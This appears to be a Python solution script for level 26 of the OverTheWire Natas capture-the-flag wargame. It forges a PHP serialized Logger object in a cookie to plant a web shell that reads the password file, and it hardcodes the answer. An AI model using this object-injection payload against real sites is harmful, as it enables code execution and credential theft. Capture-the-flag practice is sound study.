import base64

import requests

import natas25
from helpers import between


def solution(password: str = None, cheat: bool = False) -> str:
    if cheat:
        return "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"
    url = "http://natas26.natas.labs.overthewire.org"
    username = "natas26"
    if not password:
        password = natas25.solution(cheat=True)

    # The source code shows that the app is unserializing from the
    # drawing cookie. We can reserialize our own modified version
    # of the Logger class (see natas26.php).

    s = requests.Session()
    auth = (username, password)
    s.get(url, auth=auth)
    # See natas26.php
    serialized_php = (
        'O:6:"Logger":3:{s:15:"\x00Logger\x00logFile";'
        's:15:"img/natas27.php";s:15:"\x00Logger\x00initMsg";'
        's:48:"<?php system(\'cat /etc/natas_webpass/natas27\')?>";'
        's:15:"\x00Logger\x00exitMsg";s:0:"";}'
    )
    s.cookies["drawing"] = base64.b64encode(
        serialized_php.encode("utf-8")
    ).decode("utf-8")
    params = {"x1": "0", "y1": "0", "x2": "0", "y2": "0"}
    s.get(url, auth=auth, params=params)
    password_url = "{url}/{path}".format(url=url, path="img/natas27.php")
    r = s.get(password_url, auth=auth)
    natas27_password = r.text.splitlines()[0].strip()
    return natas27_password
